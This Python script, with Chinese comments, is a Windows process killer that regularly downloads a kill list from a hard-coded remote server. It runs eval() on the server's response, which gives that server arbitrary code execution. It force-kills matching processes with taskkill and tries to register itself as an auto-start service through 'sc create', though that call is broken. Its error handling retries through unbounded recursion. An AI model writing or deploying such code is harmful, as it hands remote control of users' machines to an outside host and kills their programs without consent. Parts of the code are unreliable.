import os,time,pickle
import psutil
import threading
import requests,random,sys

class ProceessLibrary(object):
    def __init__(self):
        self.killedLibrary = set()

    def fromServerGetKilled(self):
        '''
            获取需要杀死的进程，从服务器上。
        '''
        try:
            while True:
                # 请求地址
                response = requests.get(url="http://www.lingyunyi.com/lingyunyi/getKilledName")
                datalist = eval(response.text)
                for i in datalist:
                    self.killedLibrary.add(i)
                # 一天获取一次
                time.sleep(60*30)
        except BaseException as e:
            time.sleep(60*60)
            print(e)
            # 如果出现错误，重复调用自己
            self.fromServerGetKilled()
            return e


class ProcessKiller(object):

    def __init__(self):
        # 实例化死亡库
        self.proceessLibrary = ProceessLibrary()
        # 获取一次互联网信息,target,里面不能放括号，否则变成执行
        getLibrary = threading.Thread(target=self.proceessLibrary.fromServerGetKilled)
        getLibrary.start()
        # 当前进程库
        self.currentLibrary = []

    def moveSystem(self):
        '''
            将自己注册为自启动服务
        '''
        try:
            command = "sc create Killer1.0 binpath= %s type= own start= auto displayname= Killer1.0" %(os.getcwd()+os.path.basename(__file__))
            # 将自己设置为自启服务
            os.system()
        except BaseException as e:
            self.moveSystem()

    def killer(self,im=None,pid=None):
        '''
            杀死指定的进程
        '''
        try:
            if im != None:
                command = 'taskkill /F /IM %s' %(im)
                os.system(command)
            if pid != None:
                command = 'taskkill /F /PID %s' % (pid)
                os.system(command)
        except BaseException as e:
            print(e)
            return e

    def getCurrentAllProcess(self):
        '''
            获取当前所有进程信息以及进程名字
        '''
        self.selfProcessPID = []
        try:
            # 获取所有进度PID号
            pids = psutil.pids()
            # 循环所有PID号
            templateList = []
            for pid in pids:
                # 获取相应的PID进程信息
                p = psutil.Process(pid)
                # 将PID的名字添加到信息库中
                templateList.append(p.name())
                # os.path.basename(__file__)
                currentName = os.path.basename(sys.argv[0])
                # print(currentName,os.path.basename(sys.argv[0]),os.path.basename(__file__))
                if p.name() == currentName:
                    self.selfProcessPID.append(pid)
            self.currentLibrary = templateList
            # 为了防止死循环，不出错误，结束自己
            return True
        except BaseException as e:
            # 如果出现错误重复调用自己
            print(e)
            self.getCurrentAllProcess()
            return e

    def mainStart(self):
        try:
            while True:
                if self.proceessLibrary.killedLibrary != []:
                    # 如果有值
                    self.getCurrentAllProcess()
                    for killedName in self.proceessLibrary.killedLibrary:
                        # 获取所有得到的自己程序PID
                        # print(self.selfProcessPID)
                        if killedName in self.currentLibrary:
                            print("killedNmae：%s" %killedName)
                            # 执行死亡程序
                            self.killer(im=killedName)
                        # 检测发现有自启的多一个程序，所以为3
                        if len(self.selfProcessPID) >= 3:
                            last = self.selfProcessPID.pop()
                            print("killedPID：%s" % last)
                            self.killer(pid=last)
                time.sleep(random.randint(3,8))
        except BaseException as e:
            print(e)
            return e




if __name__ == '__main__':

    k = ProcessKiller()
    k.mainStart()
